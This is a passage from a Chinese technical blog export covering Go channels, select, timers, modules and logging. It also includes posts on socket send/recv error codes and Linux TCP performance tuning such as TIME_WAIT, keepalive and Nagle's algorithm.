创建大小为10 的缓冲信道//如果没有设置容量，或者容量设置为0, 说明Channel没有缓存，只有sender和receiver都准备好了后它们的通讯(communication)才会发生(Blocking)。如果设置了缓存，就有可能不发生阻塞， //只有buffer满了后 send才会阻塞， 而只有缓存空了后receive才会阻塞。一个nil channel不会通信。func download(url string) { fmt.Println(&quot;start donwload,url=&quot;, url) time.Sleep(time.Second * 5) // 模拟耗时 msg := url + &quot; call&quot; ch &lt;- msg // 发送值msg到Channel ch中}func main() { fmt.Println(&quot;start all download, time=&quot;, time.Now().Format(&quot;2006-01-02 15:04:05&quot;)) t1 := time.Now() for i := 0; i &lt; 10; i++ { go download(&quot;www.test_go.com/index&quot; + string(i + '0')) } for i := 0; i &lt; 10; i++ { msg := &lt;-ch //// 从Channel ch中接收数据，并将数据赋值给msg fmt.Println(&quot;finish&quot;, msg) } t2 := time.Since(t1) / time.Second fmt.Printf(&quot;download done, time_use=%ds\\n&quot;, t2) close(ch)} Go 中 channel 的一个有趣特性是，在使用 channel 作为函数的参数时，可以指定 channel 是要发送数据还是接收数据。 随着程序的增长，可能会使用大量的函数，这时候，最好记录每个 channel 的意图，以便正确使用它们。 12chan&lt;- int // it's a channel to only send data&lt;-chan int // it's a channel to only receive data 两个函数的示例，一个函数用于读取数据，另一个函数用于发送数据： 1234567891011121314151617181920package mainimport ( &quot;fmt&quot;)func send(ch chan&lt;-string, message string) { fmt.Printf(&quot;sending: %#v\\n&quot;, message) ch &lt;- message}func read(ch &lt;-chan string) { fmt.Printf(&quot;recieving: %#v\\n&quot;, &lt;-ch)}func main() { ch := make(chan string, 1) send(ch, &quot;hello world&quot;) read(ch)} 1234func read(ch &lt;-chan string) { fmt.Printf(&quot;Receiving: %#v\\n&quot;, &lt;-ch ch &lt;- &quot;Bye!&quot;} 如果试图使用一个 channel 在一个仅用于接收数据的 channel 中发送数据，将会出现编译错误。 12# command-line-arguments./main.go:12:5: invalid operation: ch &lt;- &quot;Bye!&quot; (send to receive-only type &lt;-chan string) 报错 12# command-line-arguments./main.go:12:5: invalid operation: ch &lt;- &quot;Bye!&quot; (send to receive-only type &lt;-chan string) 多路复用有时候我们需要处理多个channel，此时可以使用select来做多路复用，需要等待事件发生。 select 语句的工作方式类似于 switch 语句，但它适用于 channel。 它会阻止程序的执行（阻塞），直到它收到要处理的事件。 如果它收到多个事件，则会随机选择一个。 select 语句的一个重要方面是，它在处理事件后完成执行。 如果要等待更多事件发生，则可能需要使用循环。 1234567891011121314151617181920212223242526272829303132package mainimport ( &quot;fmt&quot; &quot;time&quot;)func process(ch chan string) { time.Sleep(3 * time.Second) ch &lt;- &quot;Done processing!&quot;}func replicate(ch chan string) { time.Sleep(time.Second) ch &lt;- &quot;Done replicating!&quot;}func main() { ch1 := make(chan string) ch2 := make(chan string) go process(ch1) go replicate(ch2) for i := 0; i &lt; 2; i++ { select { case process := &lt;-ch1: fmt.Println(process) case replicate := &lt;-ch2: fmt.Println(replicate) } }} 输出 12Done replicating!Done processing! Timer和TickerTicker比较有用，可以周期性执行某些逻辑 12345678910111213141516171819202122232425262728293031323334353637383940package main// gorountine 并发编程，Timer和Tickerimport ( &quot;fmt&quot; &quot;time&quot;)func main() { timer1 := time.NewTimer(time.Second * 2) // timer是一个定时器，代表未来的一个单一事件，你可以告诉timer你要等待多长时间 go func() { &lt;-timer1.C fmt.Println(&quot;Timer expire&quot;) }() stop1 := timer1.Stop() if stop1 { fmt.Println(&quot;Timer stop&quot;) } //ticker是一个定时触发的计时器，它会以一个间隔(interval)往Channel发送一个事件(当前时间)， //而Channel的接收者可以以固定的时间间隔从Channel中读取事件。 ticker := time.NewTicker(time.Second * 2) go func() { for t := range ticker.C { fmt.Println(&quot;Tick,&quot;, t.Format(&quot;2006-01-02 15:04:05&quot;)) //似timer, ticker也可以通过Stop方法来停止。一旦它停止，接收者不再会从channel中接收数据了。 } }() for { time.Sleep(time.Second) } } 输出 123456789Timer stopTick, 2021-04-30 00:43:59Tick, 2021-04-30 00:44:01Tick, 2021-04-30 00:44:03Tick, 2021-04-30 00:44:05Tick, 2021-04-30 00:44:07Tick, 2021-04-30 00:44:09Tick, 2021-04-30 00:44:11Tick, 2021-04-30 00:44:13 Package和ModulesPackage一般来说，一个文件夹可以作为 package，同一个 package 内部变量、类型、方法等定义可以相互看到。 如我们新建一个文件 calc.go， main.go 平级 12345678910111213package main// main.goimport ( &quot;fmt&quot;)func main() { fmt.Println(add(1,2));} 1234567package main// calc.gofunc add(n1 int, n2 int) int { return n1 + n2} go build -o test main.go calc.go //文件名顺序并不敏感，或者go run . Modules在项目文件夹下执行go mod init example 初始化一个 Module，名字为example 12345678910111213package main// main.goimport ( &quot;fmt&quot; &quot;rsc.io/quote&quot;)func main() { mt.Println(quote.Hello())} 编译或者go run都会触发触发第三方包 rsc.io/quote的下载，具体的版本信息也记录在了go.mod中 考虑这样的项目 123456789101112131415161718192021222324252627../golearn/├── go.mod├── main.go└── mypkg └── mypkg.go````我的main.go需要调用mypkg/mypkg.go的函数，可以这样操作，先在golearn路径下生成一个module：```go mod init example```，然后通过module/目录名的方式调用，注意mypkg.go里定义的函数首字母需要大写，这样才表示该函数是public的，可以供外界调用。**Go 语言也有 Public 和 Private 的概念，粒度是包。如果类型/接口/方法/函数/字段的首字母大写，则是 Public 的，对其他 package 可见，如果首字母小写，则是 Private 的，对其他 package 不可见。**main.go```gopackage mainimport ( &quot;fmt&quot; &quot;example/mypkg&quot;)func main() { fmt.Println(&quot;test, &quot;, mypkg.Add(1,2))} 日志模块12345678910111213141516171819202122package mainimport ( &quot;log&quot; &quot;os&quot;)func main() { file, err := os.OpenFile(&quot;info.log&quot;, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644) if err != nil { log.Fatal(err) // fatal会直接退出本进程 } defer file.Close() log.SetOutput(file) log.Print(&quot;hey, logging&quot;)} 日志记录格式 12021/04/30 14:59:45 hey, logging","link":"/2021/05/04/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E2%80%94%E5%9F%BA%E6%9C%AC%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7%E7%AF%87/"},{"title":"从socket系统调用错误码分析网络异常","text":"在进行网络编程中，经常会遇到一些奇怪的网络异常或错误，这些错误其实通过分析socket 的send和recv函数的返回值和错误码就可以得到具体的错误原因，进而可以对症下药解决网络问题。 send的返回值分析 返回值 错误码 含义 解决措施 &gt;0 无 返回值表示成功拷贝到发送缓冲区的字节数 无 =0 无 发送的数据长度为0 检查发送的数据是否为空 -1 EACCES SO_BROADCAST没被设置却尝试向一个广播地址发送数据 检查发送地址是否正确，或设置SO_BROADCAST -1 EAGAIN 非阻塞模式读操作被阻塞或者读超时 正常，本次调用无数据可读，可以继续处理后面逻辑，下一个循环再读一次 -1 EWOULDBLOCK 非阻塞模式下无数据可读或接收操作被阻塞或者接收超时 正常，本次调用无数据可读，可以继续处理后面逻辑，下一个循环再读一次 -1 EBADF 使用的sockfd是无效 检查socket的建立是否成功 -1 ECONNRESET 本连接收到了rst包，对方异常关闭了双方连接，本连接已经关闭了 Connection reset by peer，在收到RST后的socket继续发送数据，会生成SIGPIPE信号, 导致进程退出（默认的系统处理SIGPIPE信号的方式） 。如果对 SIGPIPE 进行忽略处理， 二次调用write方法时, 会返回-1, 同时errno置为SIGPIPE。这类情况的处理方法是遇到ECONNRESET的错误码就调用close关闭连接。 -1 EFAULT 访问了无效的用户地址空间，即指向缓冲区的指针有误 检查缓冲区指针是否有分配空间，空间是否异常回收了 -1 EHOSTUNREACH 对方地址不可达 检查一下对方的网络状态,如ping探测一下 -1 EINTR 由于信号中断，没写成功任何数据。 正常，本次调用没有写入任何数据到发生缓冲区，下次调用需要再次写入 -1 EMSGSIZE 发送的数据过大，无法发送 出现在UDP发送数据时，发送的数据大于MTU 1500字节时发生，可以 调整发送数据的大小，分批发送；或者调大MTU，但不推荐 -1 ENETDOWN 本地网络接口无法正常工作 检查网卡，检查网络是否正常 -1 ENETUNREACH 无网络路由 检查路由 -1 ENOBUFS 网卡的发送队列已满，一般表示网卡无法发送数据了 UDP头域有一个16bit的字段用于标识UDP的包大小，所以一个UDP包数据长度最大为65K -1 EPIPE 尝试往一个已经断开的socket发送数据，第一次会产生ECONNRESET，如果后续继续这样做，系统会产生SIGPIPE信号通知线程，错误码变为EPIPE 会产生broken pipe的错误，正确处理方式是close掉这个连接。建议应用根据需要处理SIGPIPE信号，至少不要用系统缺省的处理方式处理这个信号，系统缺省的处理方式是退出进程，这样你的应用就很难查处处理进程为什么退出。 -1 EADDRNOTAVAIL 指定的本地地址已经不再可用了 ifconif查看自己的IP是否变化了，是否与socket使用的IP不同 -1 EINVAL 函数传参错误 检查传参 recv的返回值分析 返回值 错误码 含义 解决措施 &gt;0 无 成功接收到的数据字节数 0 无 对方已正常关闭连接 应用进程调用close关闭本方连接 -1 EAGAIN 非阻塞模式下无数据可读或接收操作被阻塞或者接收超时 正常，本次调用无数据可读，可以继续处理后面逻辑，下一个循环再读一次 -1 EWOULDBLOCK 非阻塞模式下无数据可读或接收操作被阻塞或者接收超时 正常，本次调用无数据可读，可以继续处理后面逻辑，下一个循环再读一次 -1 EBADF 使用的sockfd是无效 检查socket的建立是否成功 -1 ECONNRESET 本连接收到了rst包，对方异常关闭了双方连接，本连接已经关闭了 Connection reset by peer，在收到RST后的socket继续读数据，会生成SIGPIPE信号, 导致进程退出（默认的系统处理SIGPIPE信号的方式） 。如果对 SIGPIPE 进行忽略处理， 二次调用recv方法时, 会返回-1, 同时errno置为SIGPIPE。这类情况的处理方法是遇到ECONNRESET的错误码就调用close关闭连接。 -1 EFAULT 访问了无效的用户地址空间，即指向缓冲区的指针有误 检查缓冲区指针是否有分配空间，空间是否异常回收了 -1 EINTR 由于信号中断返回，没有任何数据可用。 正常，本次调用无数据可读，可以继续处理后面逻辑，下一个循环再读一次 -1 ENOBUFS 系统无法再分配内部缓冲区，内存不足 系统层面的问题，检查系统内存使用情况 -1 ENOTCONN 面向连接的socket尚未连接 检查是否判断了connet的状态，可能是connet失败了但自己还是继续调用recv读数据 -1 ETIMEDOUT 连接超时，TCP keepalive 超时触发 对方已经可能连接关闭了，我们调用close关闭自己的连接 -1 EINVAL 函数传参错误 检查传参 -1 ECONNREFUSED 对方拒绝网络连接 调用close关连接，检查接收方的网络访问策略 -1 EPIPE 尝试往一个已经断开的socket读取数据，第一次会产生ECONNRESET，如果后续继续这样做，系统会产生SIGPIPE信号通知线程，错误码变为EPIPE 会产生broken pipe的错误，正确处理方式是close掉这个连接。建议应用根据需要处理SIGPIPE信号，至少不要用系统缺省的处理方式处理这个信号，系统缺省的处理方式是退出进程，这样你的应用就很难查处处理进程为什么退出。 特别：返回值&lt;0时并且(errno == EINTR || errno == EWOULDBLOCK || errno == EAGAIN)的情况下认为连接是正常的，继续接收。 总结常见的网络异常情况1. bind()时的address already usedbind()时失败，错误码为EADDRINUSE。 原因： 有线程或进程占用着该IP和端口，导致bind失败。 进程运行，然后重启了，因为有time_wait状态的存在，需要等待2msl的时间才能释放端口，在释放端口前进行bind，也会失败。 有进程使用了0.0.0.0绑定了相同的端口（0.0.0.0表示所有本地网络地址）。在默认设置下，没有socket能够绑定到同一地址的同一端口。比如在Socket A已经绑定了0.0.0.0:8000以后，Socket B若是想要绑定192.168.0.100:8000，那就会报EADDRINUSE。因为Socket A已经绑定了所有ip地址的8000端口，包括192.168.0.100:8000。 地址冲突情况列举： SO_REUSEADDR socketA socketB Result ON/OFF 192.168.0.1:21 192.168.0.1:21 Error (EADDRINUSE) ON/OFF 192.168.0.1:21 10.0.0.1:21 OK ON/OFF 10.0.0.1:21 192.168.0.1:21 OK OFF 0.0.0.0:21 192.168.1.0:21 Error (EADDRINUSE) OFF 192.168.1.0:21 0.0.0.0:21 Error (EADDRINUSE) ON 0.0.0.0:21 192.168.1.0:21 OK ON 192.168.1.0:21 0.0.0.0:21 OK ON/OFF 0.0.0.0:21 0.0.0.0:21 Error (EADDRINUSE) 解决：setsockopt里设置SO_REUSEADDR。设置了SO_REUSEADDR以后，判断冲突的方式就变了。只要地址不是正好(exactly)相同，那么多个Socket就能绑定到同一ip上。比如0.0.0.0和192.168.0.100，虽然逻辑意义上前者包含了后者，但是0.0.0.0泛指所有本地ip，而192.168.0.100特指某一ip，两者并不是完全相同，所以Socket B尝试绑定的时候，不会再报EADDRINUSE，而是绑定成功。另外，SO_REUSEADDR的另一个作用是，可以绑定TIME_WAIT状态的地址。 2. connect()时的address already usedConnect()失败，错误码为EADDRINUSE。 在默认情况下，一般在bind()时可能会出现EADDRINUSE问题，bind()时因为src ip和src port已经不同，不可能报EADDRINUSE。但是在SO_REUSEADDR和SO_REUSEPORT下，因为地址有重用，那么当重用的地址端口尝试连接同一个远端主机的同一端口时(connect()时)，就会报EADDRINUSE。 比如本机只有两个地址，127.0.0.1和192.168.0.1，其中后者是可访问因特网的网卡的地址。在SO_REUSEADDR下，并且Socket A绑定了Socket A0.0.0.0:8000, Socket B绑定了192.168.0.1:8000以后，Socket A发起了与远端主机111.13.101.208:80的连接。此时根据路由表规则，连接将被绑定到192.168.0.1，产生的连接ID为{, &lt;192.168.0.1&gt;, &lt;8000&gt;, &lt;111.13.101.208&gt;, &lt;80&gt;}，Socket A连接成功。但是如果Socket B也想尝试发起与远端主机111.13.101.208:80的连接，就会产生一样的连接ID，所以报了EADDRINUSE。 linux kernel 3.9 引入了最新的SO_REUSEPORT选项，使得多进程或者多线程创建多个绑定同一个ip:port的监听socket，提高服务器的接收链接的并发能力,程序的扩展性更好；此时需要设置SO_REUSEPORT（注意所有进程都要设置才生效）。使用方法： 1setsockopt(listenfd, SOL_SOCKET, SO_REUSEPORT,(const void *)&amp;reuse , sizeof(int)); SO_REUSEPORT的三个作用： 每一个进程有一个独立的监听socket，并且bind相同的ip:port，独立的listen()、accept()和connect()；提高接收连接的能力。（例如nginx多进程同时监听同一个ip:port） 避免了应用层多线程或者进程监听同一ip:port的“惊群效应”。 内核层面实现负载均衡，保证每个进程或者线程接收均衡的连接数。 SO_REUSEPORT套接字选项起作用的三个前提： 本选项允许完全重复的捆绑，不过只有在想要捆绑同一IP地址和端口的每个套接字都指定了本套接字选项才行。 如果被捆绑的IP地址是一个多播地址，那么SO_REUSEADDR和SO_REUSEPORT被认为是等效的 只进程用户组相同的服务器进程才能监听同一ip:port （安全性考虑），一个用户便不能窃取其他用户的端口，这一点不同于SO_REUSEADDR。 现在已经存在一个没有启用SO_REUSEPORT选项的套接字，而另外一个设置了SO_REUSEPORT选项的套接字要绑定与第一个套接字相同的地址和端口，这种情况会绑定失败，就算已绑定套接字是一个处于在TIME_WAIT状态的连接，也无法成功；要绑定一个与TIME_WAIT状态相同地址和端口的套接字，要么设置在新套接字上设置SO_REUSEADDR选项，要么在原套接字和将要绑定的套接字上都设置SO_REUSEPORT选项；当然也允许同时设置SO_REUSEADDR和SO_REUSEPORT选项； 4. connect reset by peer这个提示的出现的情景：己方socket给对方发送数据时，对方因为异常情况回了RST包，己方系统也会关闭这个连接，回收相应的socket资源，并往上通知应用进程，当应用程序调用recv或send进行数据读写时，其返回值为-1，error被设为ECONNRESET，要求应用程序自行处理该异常。 因此，当网络编程中需要处理send()范围值为-1的异常情况，同时检查errorn是否为ECONNRESET，如果是错误码是ECONNRESET，就表明对方已经异常关闭了连接，我们系统收到RST包会也会断掉连接，此时的socket已经是不可用了。此时我们应该调用close()，结束本次通信。 5. broken pipe如果我们无视ECONNRESET错误，继续往已被RST关闭的连接发送数据时，就会触发“broken pipe”的错误提示，而且send的返回值仍为-1.error被设为EPIPE。因为该连接已经断开了，因此还往这个socket发送数据是一个未定义的行为，因此需要避免这个行为，因为很危险，可能会导致进程异常退出。因为发生这种向一个因为RST关闭的连接发送数据，系统会产生一个SIGPIPE的信号，通知进程处理，但是进程没有接管这个信号，系统默认会杀死进程。 因此针对该情况的解决方法就是，判断我们send的返回值是否为-1且error为ECONNRESET，是则马上close掉连接。","link":"/2020/12/28/%E4%BB%8Esocket%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E9%94%99%E8%AF%AF%E7%A0%81%E5%88%86%E6%9E%90%E7%BD%91%E7%BB%9C%E5%BC%82%E5%B8%B8/"},{"title":"网络性能优化策略","text":"Linux网络性能优化实际优化的是Linux内核或者系统调用的几个参数，我们可以从应用程序、套接字、传输层、网络层以及链路层等几个角度，分别来看网络性能优化的基本思路。 网络性能指标 带宽：带宽，表示链路的最大传输速率，单位通常为 b/s （比特/秒）。 吞吐量：表示单位时间内成功传输的数据量，单位通常为 b/s（比特/秒）或者 B/s（字节/秒）。吞吐量受带宽限制，而吞吐量/带宽，也就是该网络的使用率。 延时：表示从网络请求发出后，一直到收到远端响应，所需要的时间延迟。在不同场景中，这一指标可能会有不同含义。比如，它可以表示，建立连接需要的时间（比如 TCP 握手延时），或一个数据包往返所需的时间（比如 RTT）。 PPS：是 Packet Per Second（包/秒）的缩写，表示以网络包为单位的传输速率。PPS 通常用来评估网络的转发能力，比如硬件交换机，通常可以达到线性转发（即PPS可以达到或者接近理论最大值）。而基于 Linux 服务器的转发，则容易受网络包大小的影响。 除了这些指标，网络的可用性（网络能否正常通信）、并发连接数（TCP连接数量）、丢包率（丢包百分比）、重传率（重新传输的网络包比例）等也是常用的性能指标。 网络收发包流程这里介绍进程收到网络数据的整个流程： 一个网络帧到达网卡，网卡会通过DMA方式，把这个包放在接收队列里（Tx Ring buff），然后通过硬中断，告诉网卡中断程序收到了网络包； 网卡中断程序会为该网络帧分配内核数据结构sk_buff(socket buffer)，再通过软中断告知内核收到了网络帧； 内核协议栈从sk_buff缓冲区将网络帧取出处理，由下至上解包处理该网络帧； 在链路层检查报文的合法性，找出上层协议的类型（比如 IPv4 还是 IPv6），再去掉帧头、帧尾，然后交给网络层； 网络层取出 IP 头，判断网络包下一步的走向，比如是交给上层处理还是转发。当网络层确认这个包是要发送到本机后，就会取出上层协议的类型（比如 TCP 还是 UDP），去掉 IP 头，再交给传输层处理。 传输层取出 TCP 头或者 UDP 头后，根据 &lt; 源 IP、源端口、目的 IP、目的端口 &gt; 四元组作为标识，找出对应的 Socket，并把数据拷贝到 Socket的接收缓存中，也就是TCP接收窗口。 最后，应用程序就可以使用 Socket read接口，程序会切换到内核区,并且会把 socket 接收缓冲区中的数据拷贝到用户区，拷贝后的数据会从 socket 缓冲区中移除。 上面的收包流程中深色标记了数据的存储位置，收到的数据一开始存储于内核专用的缓冲区，接收队列(ring buff)存的是指向这片区域的指针，后面数据被拷贝到sk_buff缓冲区（这个sk_ buff 形成的链表，就是常说的 socket 发送缓冲区），最后被拷贝到进程使用。 只在两种情况下创建 sk_ buff： 应用程序给 socket 写入数据时。 当数据包到达 NIC 时。 数据只会拷贝两次： 用户空间与内核空间之间的拷贝（socket 的 read、write）。 sk_buff 与 NIC 之间的拷贝。 MTU大小（影响时延）物理链路中并不能传输任意大小的数据包。网络接口配置的最大传输单元（MTU），就规定了最大的 IP 包大小。在我们最常用的以太网中，MTU 默认值是 1500（这也是 Linux 的默认值）。一旦网络包超过 MTU 的大小，就会在网络层分片，以保证分片后的 IP 包不大于 MTU 值。显然，MTU 越大，需要的分包也就越少，自然，网络吞吐能力就越好。因此我们可以根据 MTU 大小，调整发送的 数据包的大小，减少或者避免分片的发生。下图就表示了应用层的要发送的数据超过MTU后，会被分为多个包发送。 TCP优化网络性能优化很大一部分就是在优化TCP的系统参数，因为操作系统一般设定的一些网络参数都较为保守，因为这些参数设为保守值那系统能稳定运行在各个环境上的能力就更强。但线上服务器都有自己的特殊处境，一个万金油的值并不能满足服务器的性能要求。一个典型的例子就是，局域网内网络环境都很好，因此没有必要严格遵循TCP那套拥塞控制策略，而是应想方法尽可能地提升传输性能。 先来一张TCP三次握手四次挥手的神图镇场。 1.TIME_WAIT过多（影响并发量，吞吐量）在请求数比较大的场景下，你可能会看到大量处于 TIME_WAIT 状态的连接，它们会占用大量内存和端口资源。这时，我们可以优化与 TIME_WAIT 状态相关的内核选项，比如采取下面几种措施。 增大处于 TIME_WAIT 状态的连接数量 net.ipv4.tcp_max_tw_buckets ，并增大连接跟踪表的大小 net.netfilter.nf_conntrack_max。 减小 net.ipv4.tcp_fin_timeout 和 net.netfilter.nf_conntrack_tcp_timeout_time_wait ，让系统尽快释放它们所占用的资源。 开启端口复用 net.ipv4.tcp_tw_reuse和设置net.ipv4.tcp_timestamps=1(默认即为1)。这样，被 TIME_WAIT 状态占用的端口，还能用到新建的连接中。 增大本地端口的范围 net.ipv4.ip_local_port_range 。这样就可以支持更多连接，提高整体的并发能力。 增加最大文件描述符的数量。你可以使用 fs.nr_open 和 fs.file-max ，分别增大进程和系统的最大文件描述符数；或在应用程序的 systemd 配置文件中，配置 LimitNOFILE ，设置应用程序的最大文件描述符数。 值得注意的是，内核参数tcp_tw_recycle不建议打开，因为它的副作用是会拒绝所有比这个客户端时间戳更靠前的网络包，所以我方的就把带了“倒退”的时间戳的包当作是“recycle的tw连接的重传数据，不是新的请求”，于是丢掉不回包，造成大量丢包。但按包的时间戳来判定包是否是重传包并不靠谱，比如机器时钟并不一定相同。因此高版本的Linux已经把该参数废弃了。 除了上述方法可以移除系统中过多TIME_WAIT外，其实还可以使用SO_LIGNER参数快速关闭socket连接，不走TCP的四次挥手，而是使用RST快速关闭连接，这就避免了TIME_WAIT状态的产生。 回顾一下TCP关闭连接的两种方式： FIN：正常关闭，走4次挥手，优雅关闭，发送 FIN 包表示自己这端所有的数据都已经发送出去了，后面不会再发送数据 RST：处理异常情况，强制连接重置关闭，无法做出什么保证。 scoket编程中通过linger结构体的l_onoff和l_linger来控制整个TCP关闭连接的行为。 1234567891011struct linger { int l_onoff; /* 0 = off, nozero = on */ int l_linger; /* linger time */};struct linger so_linger;so_linger.l_onoff = 1;so_linger.l_linger = 30;z = setsockopt(s, SOL_SOCKET, SO_LINGER, &amp;so_linger,sizeof(so_linger)); 第一个字段 l_onoff 用来表示是否启用 linger 特性，非 0 为启用，0 为禁用 ，linux 内核默认为禁用。禁用情况下, close函数立即返回，操作系统负责把缓冲队列中的数据全部发送至对端 第二个参数 l_linger 在 l_onoff 为非 0 （即启用特性）时才会生效。 如果 l_linger 的值为 0，那么调用 close，close 函数会立即返回，同时丢弃缓冲区内所有数据并立即发送 RST 包重置连接 如果 l_linger 的值为非 0，那么此时 close 函数在阻塞直到 l_linger 时间超时或者数据发送完毕，发送队列在超时时间段内继续尝试发送，如果发送完成则皆大欢喜，超时则直接丢弃缓冲区内容 并 RST 掉连接。 2.CLOSE_WAIT过多（影响并发量，吞吐量）一般而言CLOSE_WAIT不会很多，但当程序发生异常时，该状态会大量出现，逐渐耗尽系统fd，影响网络并发连接数和吞吐量。 半关闭的状态下的服务器连接会处于 CLOSE_WAIT 状态，直到服务器发送了FIN。那么在应用层则是调用socket.close()会执行FIN的发送，如果服务器出现大量CLOSE_WAIT状态的连接，那么有可能的原因： 服务器压力过大，根本来不及调用close存在连接泄露问题(Bug)，比如事务回滚耗费大量时间； 服务器未及时关闭连接。（更为常见，比如逻辑不严谨，跳过了close）。 CLOSE_WAIT过多的唯一调优方法是：检查程序逻辑，确保socket.close不会异常跳过。当系统CLOSE_WAIT过多，但同时也不能杀死进程时，可以利用tcpkill等工具回收这些CLOSE_WAIT状态的僵死连接。 当系统出现大量量CLOSE_WAIT后该如何处理，方法有2： 杀死进程，就是释放进程内使用到的socket连接，因此CLOSE_WAIT的连接就会清理掉。 利用tcpkill、killcx相关工具或自己编写脚本，原理就是构造假的RST包发给对方，让对方主动断掉这条连接。那RST包的seq怎么获取呢，这是个难题，因为只有落在SEQ号落在滑动窗口内的包才会处理，否则这些包都会被丢弃。思路就是主动给模拟发一个SYN包，Linux 内核对于收到的乱序 SYN 报文，会回复一个携带了正确序列号和确认号的 ACK 报文，这个 ACK 被称之为 Challenge ACK，此时我们就获得了正确的SEQ和ACK了。最后再按照该SEQ和ACK构造RST包发给B，B收到后就会关闭连接了。此方法适合关闭所有非僵死的TCP连接。 知识点补充：系统收到RST包后会就会KILL掉这条连接，回收socket资源。阻塞模型下，内核无法主动通知应用层出错，只有应用层主动调用read()或者write()这样的IO系统调用时，内核才会利用出错来通知应用层对端RST。非阻塞模型下，select或者epoll会返回sockfd可读，应用层对其进行读取时，read()会报错RST（-1）。第一次read是返回-1，后续继续读返回将会是0。 CLOSE_WAIT意味着操作系统知道远程应用程序已关闭连接并等待本地应用程序也这样做，操作系统并没有提供 相应的TCP参数来解决此问题，因为操作系统并不知道你的程序是否还在处理重要数据，系统主动关闭CLOSE_WAIT连接并不安全。所以最好的 办法是检查拥有本地主机上的连接的应用程序。由于没有CLOSE_WAIT超时，连接可以永远保持这种状态（或者至少在程序最终关闭连接或进程存在或被杀死之前）。当确认了直接KILL socket连接不会对业务逻辑有影响时，才可以考虑使用KILLCX等工具。 3.SYN FLOOD（影响吞吐和并发数）为了缓解 SYN FLOOD 等，利用 TCP 协议特点进行攻击而引发的性能问题，你可以考虑优化与 SYN 状态相关的内核选项，比如采取下面几种措施。 增大 TCP 半连接的最大数量 net.ipv4.tcp_max_syn_backlog ，或者开启 TCP SYN Cookies net.ipv4.tcp_syncookies ，来绕开半连接数量限制的问题（注意，这两个选项不可同时使用）。 减少 SYN_RECV 状态的连接重传 SYN+ACK 包的次数 net.ipv4.tcp_synack_retries。 4.Keepalive（影响吞吐和并发量）如果一个给定的连接在两小时内（默认时长）没有任何的动作，则服务器就向客户发一个探测报文段，客户主机必须处于以下4个状态之一： 客户主机依然正常运行，并从服务器可达。客户的TCP响应正常，而服务器也知道对方是正常的，服务器在两小时后将保活定时器复位。 客户主机已经崩溃，并且关闭或者正在重新启动。在任何一种情况下，客户的TCP都没有响应。服务端将不能收到对探测的响应，并在75秒后超时。服务器总共发送10个这样的探测 ，每个间隔75秒。如果服务器没有收到一个响应，它就认为客户主机已经关闭并终止连接。 客户主机崩溃并已经重新启动。服务器将收到一个对其保活探测的响应，这个响应是一个复位（RST），使得服务器终止这个连接。 客户机正常运行，但是服务器不可达，这种情况与2类似，TCP能发现的就是没有收到探测的响应。 对于linux内核来说，应用程序若想使用TCP Keepalive，需要设置SO_KEEPALIVE套接字选项才能生效。 在长连接的场景中，通常使用 Keepalive 来检测 TCP 连接的状态，以便对端连接断开后，可以自动回收。但是，系统默认的 Keepalive 探测间隔和重试次数，一般都无法满足应用程序的性能要求，一般而言，打开了keepalive功能但没做参数优化，那建议不要打开了，因为tcp 默认的keepalive参数效率太低了。看看这些默认的参数： 12345678# cat /proc/sys/net/ipv4/tcp_keepalive_time 7200 # cat /proc/sys/net/ipv4/tcp_keepalive_intvl 75 # cat /proc/sys/net/ipv4/tcp_keepalive_probes 9 2小时才发一次心跳包，心跳包没收到回复后继续探测间隔是75秒，一共重试9次才认为当前连接已经关闭。这样一算下来，一旦对方已经挂了，自己还继续等待2个多小时才会释放该socket，那socket的利用率实在太低了。 所以，这时候你需要优化与 Keepalive 相关的内核选项，比如： 缩短最后一次数据包到 Keepalive 探测包的间隔时间 net.ipv4.tcp_keepalive_time； 缩短发送 Keepalive 探测包的间隔时间 net.ipv4.tcp_keepalive_intvl； 减少 Keepalive 探测失败后，一直到通知应用程序前的重试次数 net.ipv4.tcp_keepalive_probes。 5.Nagle算法和延迟ACK导致的网络延时（影响时延）Nagle算法和delay ack机制是减少发送端和接收端包量的两个机制，可以有效减少网络包量，避免拥塞。但是，在特定场景下，Nagle算法要求网络中只有一个未确认的包， 而delay ack机制需要等待更多的数据包， 再发送ACK回包， 导致发送和接收端等待对方发送数据， 造成死锁， 只有当delay ack超时或者发送方等待超时后才能解开死锁，进而导致应用侧对外的延时高。 Nagle算法主要是避免发送小的数据包，要求TCP连接上最多只能有一个未被确认的小分组，在该分组的确认到达之前不能发送其他的小分组。相反，TCP收集这些少量的小分组，并在接收方的确认到来时以一个分组的方式发出去。 考虑发送一个字节的的情景，每次发送一个字节的有用数据，就会产生41个字节长的分组，20个字节的IP Header 和 20个字节的TCP Header，这就导致了1个字节的有用信息要浪费掉40个字节的头部信息，这是一笔巨大的字节开销，而且这种Small packet在广域网上会增加拥塞的出现。因此Nagle算法是用于缓解网络拥塞的优化手段。该算法的优越之处在于它是自适应的，确认到达的越快，数据也就发送的越快。 Nagle核心算法思想:一个TCP连接上最多只能有一个未被确认的小数据包，在该分组的确认到达之前，不能发送其他的小数据包。数据发送时是否选择立即发送判定步骤如下： 123451. 如果发送内容&gt;=1个MSS， 立即发送；2. 如果之前没有包未被确认， 立即发送；3. 如果之前有包未被确认， 缓存发送内容；4. 如果收到ack， 立即发送缓存的内容。5. 上述条件都未满足，但发生了超时（一般为200ms），则立即发送。 这里介绍一下MSS和MTU。 网络 MTU (Maximum Transmission Unit，最大传输单元) 表示网络一次传输的最大数据字节数 (不包括网络封装占用字节数)，通常 MTU 是网络硬件规定的。 对于最常用的以太网，MTU 是 1500 字节。 TCP MSS (Maximum Segment Size，最大分节大小)，用于告诉 TCP 对端在每个分节中能够发送的最大 TCP 数据量。 MSS 的目的是告诉对端其重组缓冲区大小的实际值，从而试图避免分片。 MSS 经常设置成为 MTU (1500) - IP 固定长度 (20) - TCP 固定长度 (20) = 1460 字节，IPv6 是 1440 字节，因为 IPv6 长度为 40 字节。 延迟ACK的核心思想与Nagle思想是一致的，只是一个针对发送方，一个针对接收方。延迟ack：如果tcp对每个数据包都发送一个ack确认，那么只是一个单独的数据包为了发送一个ack代价比较高，所以tcp会延迟一段时间，如果这段时间内有数据发送到对端，则捎带发送ack，如果在延迟ack定时器触发时候（超时了），发现ack尚未发送，则立即单独发送，因此延迟ACK同样是用于缓解网络拥塞的优化手段。 Nagle算法关联的socket 